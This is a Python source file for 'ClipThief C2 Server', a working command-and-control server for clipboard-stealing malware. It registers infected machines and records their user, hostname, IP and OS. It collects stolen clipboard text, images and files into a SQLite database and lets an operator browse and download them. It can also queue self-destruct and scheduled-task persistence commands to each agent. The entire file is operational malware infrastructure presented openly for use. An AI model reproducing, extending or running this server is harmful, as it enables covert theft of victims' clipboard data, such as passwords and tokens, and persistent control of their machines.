#!/usr/bin/env python3
"""
ClipThief C2 Server
@erberkan / B3R-SEC

Terminal-based Command & Control server.
Receives: agent registration, clipboard data (text / image / file)
Sends:    kill (self-destruct) | persist (scheduled task)
Storage:  SQLite (c2_data.db) — survives restarts

Usage:
    python c2_server.py [--host HOST] [--port PORT]
"""

import os
import sys
import base64
import sqlite3
import threading
import argparse
import time
import queue
from datetime import datetime
from pathlib import Path

try:
    from flask import Flask, request, jsonify
except ImportError:
    print("[!] Flask not found.  Run:  pip install flask")
    sys.exit(1)

# ============================================================
#  Paths
# ============================================================
BASE_DIR      = Path(__file__).parent
DB_PATH       = BASE_DIR / "c2_data.db"
DOWNLOADS_DIR = BASE_DIR / "downloads"

# ============================================================
#  Flask
# ============================================================
app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 200 * 1024 * 1024

import logging
logging.getLogger("werkzeug").setLevel(logging.ERROR)

# ============================================================
#  In-memory state  (loaded from DB on startup)
# ============================================================
agents: dict       = {}   # id -> info dict
pending_cmds: dict = {}   # id -> "kill" | "persist"
db_lock            = threading.Lock()
new_agent_queue: queue.Queue = queue.Queue()

# Agent, POLL_MS=3s'de bir polling yapar.
# 3 ardışık polling kaçırılırsa (~10s) agent dead sayılır.
AGENT_TIMEOUT_SEC = 10

# ============================================================
#  Database helpers
# ============================================================

def db_connect() -> sqlite3.Connection:
    """Open a thread-local DB connection with WAL mode."""
    conn = sqlite3.connect(str(DB_PATH), check_same_thread=False)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA foreign_keys=ON")
    return conn

def db_init():
    """Create tables if they don't exist and load agents into memory."""
    conn = db_connect()
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS agents (
            id         TEXT PRIMARY KEY,
            user       TEXT,
            hostname   TEXT,
            ip         TEXT,
            os         TEXT,
            first_seen TEXT,
            last_seen  TEXT,
            status     TEXT
        );

        CREATE TABLE IF NOT EXISTS clipboard_entries (
            rowid      INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id   TEXT NOT NULL,
            seq        INTEGER NOT NULL,
            type       TEXT NOT NULL,
            content    TEXT NOT NULL,
            filename   TEXT,
            timestamp  TEXT NOT NULL,
            FOREIGN KEY(agent_id) REFERENCES agents(id)
        );
    """)
    conn.commit()

    # Load existing agents into memory
    for row in conn.execute("SELECT * FROM agents").fetchall():
        agents[row["id"]] = dict(row)

    conn.close()
    print(f"[*] Database: {DB_PATH}  ({len(agents)} agents loaded)")

def db_upsert_agent(info: dict):
    conn = db_connect()
    conn.execute("""
        INSERT INTO agents (id, user, hostname, ip, os, first_seen, last_seen, status)
        VALUES (:id, :user, :hostname, :ip, :os, :first_seen, :last_seen, :status)
        ON CONFLICT(id) DO UPDATE SET
            last_seen = excluded.last_seen,
            status    = excluded.status
    """, info)
    conn.commit()
    conn.close()

def db_insert_clip(agent_id: str, seq: int, clip_type: str,
                   content: str, filename: str, timestamp: str):
    conn = db_connect()
    conn.execute("""
        INSERT INTO clipboard_entries
            (agent_id, seq, type, content, filename, timestamp)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (agent_id, seq, clip_type, content, filename, timestamp))
    conn.commit()
    conn.close()

def db_get_clips(agent_id: str) -> list:
    conn = db_connect()
    rows = conn.execute("""
        SELECT seq, type, content, filename, timestamp
        FROM clipboard_entries
        WHERE agent_id = ?
        ORDER BY seq
    """, (agent_id,)).fetchall()
    conn.close()
    return [{"id": r["seq"], "type": r["type"], "content": r["content"],
             "filename": r["filename"], "timestamp": r["timestamp"]} for r in rows]

def db_next_seq(agent_id: str) -> int:
    conn = db_connect()
    row = conn.execute("""
        SELECT COALESCE(MAX(seq), 0) + 1 AS next FROM clipboard_entries WHERE agent_id = ?
    """, (agent_id,)).fetchone()
    conn.close()
    return row["next"]

def db_clear_all():
    """Delete every row from both tables."""
    conn = db_connect()
    conn.executescript("""
        DELETE FROM clipboard_entries;
        DELETE FROM agents;
    """)
    conn.commit()
    conn.close()

def db_clear_agent(agent_id: str):
    """Delete one agent and all their clipboard entries."""
    conn = db_connect()
    conn.execute("DELETE FROM clipboard_entries WHERE agent_id = ?", (agent_id,))
    conn.execute("DELETE FROM agents WHERE id = ?", (agent_id,))
    conn.commit()
    conn.close()

# ============================================================
#  REST API
# ============================================================

@app.route("/api/agent/register", methods=["POST"])
def api_register():
    data     = request.get_json(force=True, silent=True) or {}
    agent_id = data.get("id", "").strip()
    if not agent_id:
        return jsonify({"error": "missing id"}), 400

    now = _now()
    with db_lock:
        is_new = agent_id not in agents
        if is_new:
            info = {
                "id":         agent_id,
                "user":       data.get("user",     "unknown"),
                "hostname":   data.get("hostname", "unknown"),
                "ip":         data.get("ip",       request.remote_addr),
                "os":         data.get("os",       "unknown"),
                "first_seen": now,
                "last_seen":  now,
                "status":     "active",
            }
            agents[agent_id] = info
        else:
            agents[agent_id]["last_seen"] = now
            agents[agent_id]["status"]    = "active"
            info = agents[agent_id]

        db_upsert_agent(info)

    if is_new:
        _notify_new_agent(info)
        new_agent_queue.put(agent_id)
    else:
        _notify(f"[~] AGENT RECONNECTED  "
                f"{info['user']}@{info['hostname']}  ({agent_id[:8]}...)")

    return jsonify({"status": "ok"})


@app.route("/api/agent/<agent_id>/clipboard", methods=["POST"])
def api_clipboard(agent_id):
    data      = request.get_json(force=True, silent=True) or {}
    clip_type = data.get("type",     "text")
    content   = data.get("content",  "")
    filename  = data.get("filename", "")
    now       = _now()

    with db_lock:
        seq = db_next_seq(agent_id)
        db_insert_clip(agent_id, seq, clip_type, content, filename, now)
        if agent_id in agents:
            agents[agent_id]["last_seen"] = now
            db_upsert_agent(agents[agent_id])

    entry   = {"id": seq, "type": clip_type, "content": content,
               "filename": filename, "timestamp": now}
    icon    = {"text": "[TXT]", "image": "[IMG]", "file": "[FILE]"}.get(clip_type, "[?]")
    _notify(f"  {icon} clip from {agent_id[:8]}...  {_clip_preview(entry)}")

    return jsonify({"status": "ok"})


@app.route("/api/agent/<agent_id>/command", methods=["GET"])
def api_command(agent_id):
    with db_lock:
        if agent_id in agents:
            agents[agent_id]["last_seen"] = _now()
            db_upsert_agent(agents[agent_id])
        cmd = pending_cmds.pop(agent_id, "none")

    return jsonify({"command": cmd})


# ============================================================
#  Helpers
# ============================================================

def _now() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

_ui_lock = threading.Lock()

def _notify(msg: str):
    with _ui_lock:
        print(f"\n  {msg}")

def _notify_new_agent(a: dict):
    W = 52
    def row(label: str, value: str) -> str:
        cell = f"{label}: {value}"[:W]
        return f"  \u2551  {cell:<{W}}  \u2551"
    with _ui_lock:
        print()
        print(f"  \u2554{'=' * (W + 4)}\u2557")
        print(f"  \u2551{'  *** NEW AGENT CONNECTED ***':^{W + 4}}\u2551")
        print(f"  \u2560{'=' * (W + 4)}\u2563")
        print(row("ID      ", a["id"]))
        print(row("User    ", a["user"]))
        print(row("Hostname", a["hostname"]))
        print(row("IP      ", a["ip"]))
        print(row("OS      ", a["os"]))
        print(row("Time    ", a["first_seen"]))
        print(f"  \u255a{'=' * (W + 4)}\u255d")
        print("  Press Enter to open agent menu...")
        print()

def _clip_preview(entry: dict) -> str:
    if entry["type"] == "text":
        try:
            text = base64.b64decode(entry["content"]).decode("utf-8", errors="replace")
            return text[:80].replace("\n", " ").replace("\r", "")
        except Exception:
            return "(decode error)"
    return entry.get("filename") or "(binary)"

def _save_clip_to_disk(agent_id: str, entry: dict) -> Path:
    DOWNLOADS_DIR.mkdir(parents=True, exist_ok=True)
    if entry["type"] == "file" and entry.get("filename"):
        suffix = Path(entry["filename"]).suffix or ".bin"
    else:
        suffix = {"text": ".txt", "image": ".bmp"}.get(entry["type"], ".bin")
    fpath = DOWNLOADS_DIR / f"{agent_id[:8]}_{entry['id']}{suffix}"
    fpath.write_bytes(base64.b64decode(entry["content"]))
    return fpath

def _open_file(path: Path):
    try:
        if sys.platform == "win32":
            os.startfile(str(path))
        elif sys.platform == "darwin":
            os.system(f'open "{path}"')
        else:
            os.system(f'xdg-open "{path}"')
    except Exception as e:
        print(f"  [!] Cannot open: {e}")

# ============================================================
#  Terminal UI — helpers
# ============================================================

def _clear():
    os.system("cls" if os.name == "nt" else "clear")

_CEYCEY = """

⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡿⣿⣿⣿
⡿⠟⠫⠋⢉⣁⣉⡉⠉⠉⠋⠛⣿⣿⣿⡛⠋⠋⠉⠉⣁⣈⣉⡐⠩⠛⢻
⣷⣦⣶⣿⡿⠯⠭⠭⠭⠭⣝⢻⣿⣿⣿⡿⢫⠭⠭⠭⠭⠭⠿⣿⣷⣦⣼
⣿⣿⣿⣩⡚⠃⢀⠀⡘⠌⢻⣸⣿⣿⣿⣷⣼⣋⢚⢀⣀⢀⠛⣊⣽⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿    Be careful what you copy. 
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢋⣿⡟⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⢙⣛⣛⣛⣛⣛⣛⣛⣉⣩⣭⣴⣾⣿⣿⢣⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣼⣿⣿⣿⣿
"""

def _banner():
    print(_CEYCEY)
    print("=" * 55)
    print("       ClipThief C2 Server  |  @erberkan / B3R-SEC")
    print("=" * 55)
    print()

def _input(prompt: str) -> str:
    with _ui_lock:
        return input(prompt).strip()

# ============================================================
#  Terminal UI — screens
# ============================================================

def screen_agent_list() -> list:
    _clear()
    _banner()
    with db_lock:
        agent_list = list(agents.values())

    if not agent_list:
        print("  No agents in database.\n")
        return agent_list

    print(f"  {'#':<4} {'ID (short)':<10} {'USER':<16} {'HOSTNAME':<20}"
          f" {'IP':<16} {'LAST SEEN':<20} STATUS")
    print("  " + "-" * 92)
    for i, a in enumerate(agent_list, 1):
        short = a["id"][:8] + "..."
        print(f"  {i:<4} {short:<10} {a['user']:<16} {a['hostname']:<20}"
              f" {a['ip']:<16} {a['last_seen']:<20} {a['status']}")
    print()
    return agent_list


def screen_agent_menu(agent_id: str):
    while True:
        _clear()
        _banner()

        with db_lock:
            a = agents.get(agent_id)

        if not a:
            print("  [!] Agent not found in database.")
            _input("  Press Enter...")
            return

        clips = db_get_clips(agent_id)

        print(f"  Agent     : {a['id']}")
        print(f"  User      : {a['user']}")
        print(f"  Hostname  : {a['hostname']}")
        print(f"  IP        : {a['ip']}")
        print(f"  OS        : {a['os']}")
        print(f"  First seen: {a['first_seen']}")
        print(f"  Last seen : {a['last_seen']}")
        print(f"  Status    : {a['status']}")
        print(f"  Clipboard entries: {len(clips)}")
        print()
        print("  [1] View clipboard history")
        print("  [2] Send KILL command  (self-destruct + delete)")
        print("  [3] Send PERSIST command  (add scheduled task)")
        print("  [4] Delete this agent from DB")
        print("  [0] Back")
        print()

        choice = _input("  > ")

        if choice == "1":
            screen_clipboard_list(agent_id)
        elif choice == "2":
            if _input("  Confirm KILL? (yes/no): ").lower() == "yes":
                with db_lock:
                    pending_cmds[agent_id] = "kill"
                print("  [+] KILL queued.")
                _input("  Press Enter...")
        elif choice == "3":
            with db_lock:
                pending_cmds[agent_id] = "persist"
            print("  [+] PERSIST queued.")
            _input("  Press Enter...")
        elif choice == "4":
            if _input("  Delete agent + all clipboard data? (yes/no): ").lower() == "yes":
                with db_lock:
                    agents.pop(agent_id, None)
                db_clear_agent(agent_id)
                print("  [+] Agent removed from database.")
                _input("  Press Enter...")
                return
        elif choice == "0":
            return


def screen_clipboard_list(agent_id: str):
    while True:
        _clear()
        _banner()

        clips = db_get_clips(agent_id)

        if not clips:
            print("  No clipboard data.\n")
            _input("  Press Enter...")
            return

        print(f"  Clipboard — {agent_id[:8]}...  ({len(clips)} entries)\n")
        print(f"  {'#':<5} {'TYPE':<6} {'TIMESTAMP':<22} PREVIEW / FILENAME")
        print("  " + "-" * 80)
        for e in clips[-50:]:
            print(f"  {e['id']:<5} {e['type']:<6} {e['timestamp']:<22} {_clip_preview(e)[:52]}")
        print()
        print("  <n>  view    D <n>  download    0  back")
        print()

        choice = _input("  > ")
        if choice == "0":
            return
        if choice.upper().startswith("D "):
            try:
                _download_entry(agent_id, int(choice.split()[1]), clips)
            except (IndexError, ValueError):
                pass
        else:
            try:
                screen_view_entry(agent_id, int(choice), clips)
            except ValueError:
                pass


def screen_view_entry(agent_id: str, clip_id: int, clips: list):
    entry = next((e for e in clips if e["id"] == clip_id), None)
    if not entry:
        print(f"  [!] Entry #{clip_id} not found.")
        _input("  Press Enter...")
        return

    _clear()
    _banner()
    print(f"  Entry #{clip_id}  |  {entry['type']}  |  {entry['timestamp']}\n")

    if entry["type"] == "text":
        try:
            text = base64.b64decode(entry["content"]).decode("utf-8", errors="replace")
        except Exception as ex:
            text = f"(decode error: {ex})"
        print("  " + "-" * 70)
        for line in text.splitlines():
            print("  " + line)
        print("  " + "-" * 70)
    else:
        try:
            saved = _save_clip_to_disk(agent_id, entry)
            print(f"  [+] Saved: {saved}")
            _open_file(saved)
        except Exception as ex:
            print(f"  [!] {ex}")

    print()
    _input("  Press Enter...")


def _download_entry(agent_id: str, clip_id: int, clips: list):
    entry = next((e for e in clips if e["id"] == clip_id), None)
    if not entry:
        print(f"  [!] Entry #{clip_id} not found.")
        _input("  Press Enter...")
        return
    try:
        saved = _save_clip_to_disk(agent_id, entry)
        print(f"  [+] Downloaded: {saved}  ({saved.stat().st_size:,} bytes)")
    except Exception as ex:
        print(f"  [!] {ex}")
    _input("  Press Enter...")


def screen_db_menu():
    """Database management screen."""
    while True:
        _clear()
        _banner()

        conn   = db_connect()
        n_ag   = conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
        n_cl   = conn.execute("SELECT COUNT(*) FROM clipboard_entries").fetchone()[0]
        db_sz  = DB_PATH.stat().st_size if DB_PATH.exists() else 0
        conn.close()

        print(f"  Database : {DB_PATH}")
        print(f"  Size     : {db_sz:,} bytes")
        print(f"  Agents   : {n_ag}")
        print(f"  Clipboard: {n_cl} entries")
        print()
        print("  [1] Clear ALL data  (agents + clipboard)")
        print("  [0] Back")
        print()

        choice = _input("  > ")
        if choice == "1":
            confirm = _input("  Type YES to confirm full wipe: ")
            if confirm == "YES":
                db_clear_all()
                with db_lock:
                    agents.clear()
                    pending_cmds.clear()
                print("  [+] Database cleared.")
                _input("  Press Enter...")
        elif choice == "0":
            return


# ============================================================
#  Main terminal loop
# ============================================================

def run_terminal_ui():
    time.sleep(0.8)

    while True:
        # Auto-navigate when a new agent arrives
        try:
            agent_id = new_agent_queue.get_nowait()
            screen_agent_menu(agent_id)
            continue
        except queue.Empty:
            pass

        agent_list = screen_agent_list()

        print("  [N]  Select agent by number")
        print("  [D]  Database management")
        print("  [R]  Refresh")
        print("  [Q]  Quit")
        print()

        choice = _input("  > ").upper()

        if choice == "Q":
            print("\n  [*] Shutting down...\n")
            os._exit(0)
        elif choice == "D":
            screen_db_menu()
        elif choice == "R":
            continue
        else:
            try:
                num = int(choice)
                if 1 <= num <= len(agent_list):
                    screen_agent_menu(agent_list[num - 1]["id"])
            except ValueError:
                pass


# ============================================================
#  Heartbeat monitor — agent timeout detection
# ============================================================

def _heartbeat_monitor():
    """Background thread: marks agents as 'dead' if polling stops."""
    fmt = "%Y-%m-%d %H:%M:%S"
    while True:
        time.sleep(5)
        now = datetime.now()
        with db_lock:
            for agent_id, a in agents.items():
                if a["status"] == "dead":
                    continue
                try:
                    last = datetime.strptime(a["last_seen"], fmt)
                    elapsed = (now - last).total_seconds()
                except ValueError:
                    continue

                if elapsed > AGENT_TIMEOUT_SEC:
                    a["status"] = "dead"
                    db_upsert_agent(a)
                    _notify(f"[!] AGENT DEAD  "
                            f"{a['user']}@{a['hostname']}  "
                            f"({agent_id[:8]}...)  "
                            f"— last seen {int(elapsed)}s ago")


# ============================================================
#  Entry point
# ============================================================

def main():
    parser = argparse.ArgumentParser(description="ClipThief C2 Server")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", default=5000, type=int)
    args = parser.parse_args()

    DOWNLOADS_DIR.mkdir(parents=True, exist_ok=True)
    db_init()

    print(f"[*] Listening on {args.host}:{args.port}")
    print()

    threading.Thread(
        target=lambda: app.run(
            host=args.host, port=args.port,
            debug=False, use_reloader=False, threaded=True,
        ),
        daemon=True, name="flask",
    ).start()

    threading.Thread(
        target=_heartbeat_monitor,
        daemon=True, name="heartbeat",
    ).start()

    run_terminal_ui()


if __name__ == "__main__":
    main()
